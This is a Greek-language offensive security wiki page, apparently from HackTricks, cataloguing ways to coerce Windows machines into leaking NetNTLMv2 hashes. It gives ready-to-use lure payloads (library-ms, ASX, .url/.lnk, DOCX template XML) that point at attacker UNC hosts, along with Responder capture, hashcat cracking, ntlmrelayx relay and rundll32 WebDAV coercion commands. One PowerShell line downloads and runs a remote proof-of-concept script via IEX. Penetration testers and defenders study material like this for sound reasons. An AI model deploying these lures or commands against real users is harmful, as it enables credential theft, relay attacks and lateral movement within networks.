# Σημεία κλοπής NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Δείτε όλες τις εξαιρετικές ιδέες από [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — από το download ενός microsoft word file online έως το ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md και [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Εγγράψιμο SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Αν μπορείτε να **γράψετε σε ένα share στο οποίο οι χρήστες ή τα scheduled jobs περιηγούνται μέσω Explorer**, τοποθετήστε αρχεία των οποίων τα metadata δείχνουν στο UNC σας (π.χ. `\\ATTACKER\share`). Η απόδοση του φακέλου ενεργοποιεί **implicit SMB authentication** και διαρρέει ένα **NetNTLMv2** στον listener σας.<sup>[[1]](#references)</sup>

1. **Δημιουργήστε lures** (καλύπτει SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Αποθέστε τα στο writable share** (οποιονδήποτε φάκελο ανοίγει το θύμα):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Ακρόαση και crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Τα Windows ενδέχεται να επεξεργαστούν πολλά αρχεία ταυτόχρονα· οτιδήποτε κάνει προεπισκόπηση ο Explorer (`BROWSE TO FOLDER`) δεν απαιτεί κλικ.

### Playlists του Windows Media Player (.ASX/.WAX)

Αν μπορέσετε να κάνετε έναν στόχο να ανοίξει ή να κάνει προεπισκόπηση μιας playlist του Windows Media Player που ελέγχετε, μπορείτε να κάνετε leak Net‑NTLMv2指向οντας την καταχώριση σε μια διαδρομή UNC. Το WMP θα προσπαθήσει να ανακτήσει τα αναφερόμενα media μέσω SMB και θα πραγματοποιήσει implicit authentication.<sup>[[3]](#references)[[4]](#references)</sup>

Παράδειγμα payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Ροή συλλογής και cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Το Windows Explorer διαχειρίζεται με μη ασφαλή τρόπο τα αρχεία .library-ms όταν ανοίγουν απευθείας μέσα από ένα ZIP archive. Αν ο ορισμός της βιβλιοθήκης δείχνει σε ένα remote UNC path (π.χ., \\attacker\share), η απλή περιήγηση/εκκίνηση του .library-ms μέσα στο ZIP κάνει το Explorer να απαριθμήσει το UNC και να στείλει NTLM authentication στον attacker. Αυτό αποδίδει ένα NetNTLMv2, το οποίο μπορεί να γίνει crack offline ή ενδεχομένως να υποβληθεί σε relay.<sup>[[2]](#references)</sup>

Ελάχιστο .library-ms που δείχνει σε ένα attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Βήματα λειτουργίας
- Δημιουργήστε το αρχείο .library-ms με το παραπάνω XML (ορίστε το IP/hostname σας).
- Συμπιέστε το (στα Windows: Send to → Compressed (zipped) folder) και παραδώστε το ZIP στον στόχο.
- Εκτελέστε έναν NTLM capture listener και περιμένετε το θύμα να ανοίξει το .library-ms μέσα από το ZIP.


### Διαδρομή ήχου υπενθύμισης ημερολογίου του Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Το Microsoft Outlook for Windows επεξεργαζόταν την extended MAPI property PidLidReminderFileParameter στα calendar items. Αν αυτή η property έδειχνε σε μια UNC path (π.χ. \\attacker\share\alert.wav), το Outlook συνδεόταν στο SMB share όταν ενεργοποιούνταν η υπενθύμιση, προκαλώντας leak του Net-NTLMv2 του χρήστη χωρίς κανένα click. Αυτό διορθώθηκε στις 14 Μαρτίου 2023, αλλά παραμένει ιδιαίτερα σημαντικό για legacy/untouched fleets και για historical incident response.<sup>[[5]](#references)</sup>

Γρήγορη εκμετάλλευση με PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Πλευρά του Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Σημειώσεις
- Ένα victim χρειάζεται μόνο να έχει το Outlook for Windows σε λειτουργία όταν ενεργοποιείται το reminder.
- Το leak αποκαλύπτει Net‑NTLMv2, κατάλληλο για offline cracking ή relay (όχι pass‑the‑hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass του CVE‑2025‑24054)

Το Windows Explorer αποδίδει αυτόματα τα εικονίδια των shortcuts. Πρόσφατη έρευνα έδειξε ότι, ακόμη και μετά το patch της Microsoft τον Απρίλιο του 2025 για τα UNC-icon shortcuts, ήταν ακόμα δυνατή η ενεργοποίηση NTLM authentication χωρίς clicks, με τη φιλοξενία του shortcut target σε UNC path και τη διατήρηση του icon τοπικά (το patch bypass καταχωρίστηκε ως CVE‑2025‑50154). Η απλή προβολή του folder προκαλεί στο Explorer την ανάκτηση metadata από το remote target, εκπέμποντας NTLM στον SMB server του attacker.<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload συντόμευσης προγράμματος (.lnk) μέσω PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ιδέες παράδοσης
- Τοποθετήστε το shortcut σε ένα ZIP και κάντε το victim να το περιηγηθεί.
- Τοποθετήστε το shortcut σε ένα writable share που θα ανοίξει το victim.
- Συνδυάστε το με άλλα lure files στον ίδιο φάκελο, ώστε ο Explorer να κάνει preview στα στοιχεία.

### No-click .LNK NTLM leak μέσω ExtraData icon path (CVE‑2026‑25185)

Τα Windows φορτώνουν τα metadata του `.lnk` κατά το **view/preview** (icon rendering), όχι μόνο κατά την εκτέλεση. Το CVE‑2026‑25185 αποκαλύπτει ένα parsing path όπου τα blocks **ExtraData** κάνουν το shell να επιλύει ένα icon path και να αγγίζει το filesystem **κατά το load**, εκπέμποντας outbound NTLM όταν το path είναι remote.

Βασικές συνθήκες trigger (παρατηρήθηκαν στο `CShellLink::_LoadFromStream`):
- Συμπεριλάβετε **DARWIN_PROPS** (`0xa0000006`) στο ExtraData (gate προς τη ρουτίνα ενημέρωσης του icon).
- Συμπεριλάβετε **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) με συμπληρωμένο το **TargetUnicode**.
- Ο loader κάνει expand τις environment variables στο `TargetUnicode` και καλεί `PathFileExistsW` στο resulting path.

Αν το `TargetUnicode` επιλύεται σε UNC path (π.χ. `\\attacker\share\icon.ico`), **η απλή προβολή ενός φακέλου** που περιέχει το shortcut προκαλεί outbound authentication. Το ίδιο load path μπορεί επίσης να ενεργοποιηθεί από το **indexing** και το **AV scanning**, καθιστώντας το πρακτικό no-click leak surface.<sup>[[7]](#references)</sup>

Research tooling (parser/generator/UI) είναι διαθέσιμο στο project **LnkMeMaybe**, για τη δημιουργία και επιθεώρηση αυτών των structures χωρίς χρήση του Windows GUI.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation μέσω `davclnt.dll,DavSetCookie`

Ο native **WebDAV client** μπορεί να γίνει abuse ώστε να εξαναγκάσει το τρέχον logon session να κάνει authentication σε ένα arbitrary **HTTP/WebDAV** endpoint:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Γιατί αυτό είναι χρήσιμο:
- Ενάντια σε έναν **attacker-controlled WebDAV server**, μπορεί να προκαλέσει **NTLM over HTTP** χωρίς να εγκαταστήσει custom client.
- Ενάντια σε **internal hosts**, είναι ένας διακριτικός τρόπος να **validate where stolen credentials are accepted** πριν από τη μετακίνηση πλευρικά.<sup>[[9]](#references)</sup>
- Η εντολή αποτελεί καλή εναλλακτική όταν το **SMB egress** φιλτράρεται, αλλά το **HTTP/WebDAV** εξακολουθεί να είναι προσβάσιμο.

Λειτουργικές σημειώσεις:
- Η υπηρεσία **WebClient** πρέπει να εκτελείται στο source host.
- Το `rundll32.exe` φορτώνει το `davclnt.dll` και αναθέτει στα Windows τη διαχείριση του WebDAV authentication χρησιμοποιώντας τα **credentials του τρέχοντος χρήστη**.<sup>[[10]](#references)</sup>
- Αν το κατευθύνετε σε υποδομή που ελέγχετε, χρησιμοποιήστε ένα NTLM-aware HTTP listener/relay όπως:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Από την οπτική του detection, επαναλαμβανόμενες εκτελέσεις του `rundll32.exe davclnt.dll,DavSetCookie` εναντίον πολλών εσωτερικών συστημάτων αποτελούν ισχυρό σήμα για **credential validation / spray-like προετοιμασία lateral movement** και όχι για φυσιολογική συμπεριφορά χρήστη.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) για coercion του NTLM

Τα έγγραφα του Office μπορούν να αναφέρονται σε ένα εξωτερικό template. Αν ορίσετε το συνημμένο template σε μια διαδρομή UNC, το άνοιγμα του εγγράφου θα πραγματοποιήσει authentication στο SMB.

Ελάχιστες αλλαγές στις DOCX relationships (μέσα στο word/):

1) Επεξεργαστείτε το word/settings.xml και προσθέστε την αναφορά στο συνημμένο template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Επεξεργαστείτε το word/_rels/settings.xml.rels και κατευθύνετε το rId1337 στο UNC σας:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Κάνε repack σε .docx και παρέδωσέ το. Εκτέλεσε τον SMB capture listener και περίμενε να ανοιχτεί.

Για ιδέες μετά το capture σχετικά με το relaying ή την κατάχρηση του NTLM, έλεγξε:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Η Microsoft μετριάζει το Outlook EoP (CVE‑2023‑23397) και εξηγεί το NTLM leak μέσω του PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Παράκαμψη security patch της Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Μια ανασκόπηση του CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Όταν καλεί το IT Support: Ανάλυση μιας καμπάνιας ModeloRAT από το Teams έως το Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – κεφαλίδα davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Σημεία ενδιαφέροντος για την κλοπή Netntlm hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
